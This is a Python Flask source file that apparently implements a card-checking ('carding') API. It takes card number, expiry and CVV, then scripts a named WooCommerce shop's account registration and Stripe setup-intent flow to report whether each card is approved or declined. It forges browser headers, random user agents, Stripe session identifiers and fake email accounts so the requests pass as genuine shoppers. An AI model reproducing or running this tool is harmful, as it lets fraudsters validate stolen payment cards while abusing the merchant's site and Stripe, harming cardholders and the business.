# app.py
from flask import Flask, request, jsonify
import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker
import logging
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

faker = Faker()

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
    """Make automated request with proper handling."""
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()

    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {}
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def extract_message(response: requests.Response) -> str:
    """Extract message from response."""
    try:
        response_json = response.json()
        
        if 'message' in response_json:
            return response_json['message']
        
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return value['message']
        
        if "error" in response_json and "message" in response_json["error"]:
            return f"| {response_json['error']['message']}"

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"

    except json.JSONDecodeError:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return match.group(1)
        
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:200]}..."
    except Exception as e:
        return f"An unexpected error occurred during message extraction: {e}"

def validate_card(card_number: str) -> bool:
    """Basic Luhn algorithm validation."""
    card_number = card_number.replace(' ', '').replace('-', '')
    if not card_number.isdigit() or len(card_number) not in [15, 16]:
        return False
    
    sum_val = 0
    for i, digit in enumerate(reversed(card_number)):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        sum_val += n
    return sum_val % 10 == 0

def parse_card_string(card_string: str) -> Dict[str, str]:
    """
    Parse card string format: card_number|exp_month|exp_year|cvv
    Example: 5432671007709459|09|26|372
    """
    parts = card_string.split('|')
    
    if len(parts) < 4:
        raise ValueError("Invalid card format. Expected: card_number|exp_month|exp_year|cvv")
    
    card_number = parts[0].strip()
    exp_month = parts[1].strip().zfill(2)
    exp_year = parts[2].strip().zfill(2)
    cvv = parts[3].strip()
    
    # Validate
    if not card_number.isdigit():
        raise ValueError("Invalid card number - must contain only digits")
    
    if not exp_month.isdigit() or int(exp_month) < 1 or int(exp_month) > 12:
        raise ValueError("Invalid expiry month - must be 01-12")
    
    if not exp_year.isdigit() or len(exp_year) != 2:
        raise ValueError("Invalid expiry year - must be 2 digits")
    
    if not cvv.isdigit() or len(cvv) < 3 or len(cvv) > 4:
        raise ValueError("Invalid CVV - must be 3-4 digits")
    
    return {
        'card_number': card_number,
        'exp_month': exp_month,
        'exp_year': exp_year,
        'cvv': cvv
    }

def run_automated_process(card_num, card_cvv, card_yy, card_mm, user_ag, client_element, guid, muid, sid):
    """Main automated process."""
    session = requests.Session()
    base_url = 'https://dilaboards.com'
    
    logger.info(f"Processing card: {card_num[-4:]}")  # Log last 4 digits only
    
    try:
        # Request 1: Initial GET
        logger.info("Step 1: Performing initial GET request...")
        url_1 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_1 = {
            'User-Agent': user_ag,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Alt-Used': 'dilaboards.com',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }
        
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        logger.info(f"Extracted regester_nouce: {regester_nouce}")
        logger.info(f"Extracted pk: {pk}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        logger.error(f"Request 1 Failed: {e}")
        return {'success': False, 'error': f'Step 1 failed: {str(e)}'}

    try:
        # Request 2: Register email
        logger.info("Step 2: Performing POST request to register email...")
        url_2 = f'{base_url}/en/moj-racun/add-payment-method/'
        headers_2 = {
            'User-Agent': user_ag,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': base_url,
            'Alt-Used': 'dilaboards.com',
            'Connection': 'keep-alive',
            'Referer': url_1,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }
        data_2 = {
            'email': faker.email(domain="gamil.com"),
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': url_1,
            'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_ag,
            'woocommerce-register-nonce': regester_nouce,
            '_wp_http_referer': '/en/moj-racun/add-payment-method/',
            'register': 'Register',
        }
        
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        logger.info(f"Extracted ajax_nonce: {ajax_nonce}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        logger.error(f"Request 2 Failed: {e}")
        return {'success': False, 'error': f'Step 2 failed: {str(e)}'}

    try:
        # Request 3: Stripe API
        logger.info("Step 3: Performing POST request to Stripe API...")
        url_3 = 'https://api.stripe.com/v1/payment_methods'
        headers_3 = {
            'User-Agent': user_ag,
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=4',
        }
        
        data_3 = {
            'type': 'card',
            f'card[number]': card_num,
            f'card[cvc]': card_cvv,
            f'card[exp_year]': card_yy,
            f'card[exp_month]': card_mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'{base_url}',
            'time_on_page': str(random.randint(100000, 999999)),
            'client_attribution_metadata[client_session_id]': client_element,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_element,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': pk,
            '_stripe_version': '2024-06-20',
        }
        
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        
        pm = response_3.json()['id']
        logger.info(f"Extracted pm (payment method ID): {pm}")
        time.sleep(random.uniform(1.0, 3.0))
    except Exception as e:
        logger.error(f"Request 3 Failed: {e}")
        return {'success': False, 'error': f'Step 3 failed: {str(e)}'}

    try:
        # Request 4: Final confirmation
        logger.info("Step 4: Performing final POST request...")
        url_4 = f'{base_url}/en/'
        headers_4 = {
            'User-Agent': user_ag,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': base_url,
            'Alt-Used': 'dilaboards.com',
            'Connection': 'keep-alive',
            'Referer': url_1,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        
        msg = extract_message(response_4)
        
        try:
            response_data = response_4.json()
            status = "Approved" if response_data.get("success") else "Declined"
            return {
                'success': True,
                'status': status,
                'message': msg,
                'full_response': response_data
            }
        except:
            return {
                'success': True,
                'status': 'Pending',
                'message': msg,
                'full_response': response_4.text
            }
    except Exception as e:
        logger.error(f"Request 4 Failed: {e}")
        return {'success': False, 'error': f'Step 4 failed: {str(e)}'}

@app.route('/')
def home():
    return jsonify({
        'status': 'online',
        'message': 'Card Validation API is running',
        'endpoint': '/autost',
        'format': 'mydomain.com/autost?card=card_number|exp_month|exp_year|cvv',
        'example': 'mydomain.com/autost?card=5432671007709459|09|26|372'
    })

@app.route('/autost', methods=['GET'])
def process_card():
    """Process card via GET request with pipe-separated format."""
    try:
        card_param = request.args.get('card')
        
        if not card_param:
            return jsonify({
                'success': False,
                'error': 'Missing card parameter',
                'format': 'Use: ?card=card_number|exp_month|exp_year|cvv',
                'example': '?card=5432671007709459|09|26|372'
            }), 400
        
        # Parse the card string
        try:
            card_data = parse_card_string(card_param)
        except ValueError as e:
            return jsonify({
                'success': False,
                'error': str(e),
                'format': 'Expected: card_number|exp_month|exp_year|cvv',
                'example': '5432671007709459|09|26|372'
            }), 400
        
        # Validate card with Luhn algorithm
        if not validate_card(card_data['card_number']):
            return jsonify({
                'success': False,
                'error': 'Invalid card number (Luhn check failed)'
            }), 400
        
        # Generate dynamic parameters
        user_agent = f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(120, 140)}.0.0.0 Mobile Safari/537.36'
        client_element = f'src_{random.randint(1000000000000, 9999999999999)}'
        guid = f'guid_{random.randint(10000000, 99999999)}'
        muid = f'muid_{random.randint(10000000, 99999999)}'
        sid = f'sid_{random.randint(10000000, 99999999)}'
        
        # Process the card
        result = run_automated_process(
            card_num=card_data['card_number'],
            card_cvv=card_data['cvv'],
            card_yy=card_data['exp_year'],
            card_mm=card_data['exp_month'],
            user_ag=user_agent,
            client_element=client_element,
            guid=guid,
            muid=muid,
            sid=sid
        )
        
        return jsonify(result)
    
    except Exception as e:
        logger.error(f"Error processing card: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Internal server error: {str(e)}'
        }), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
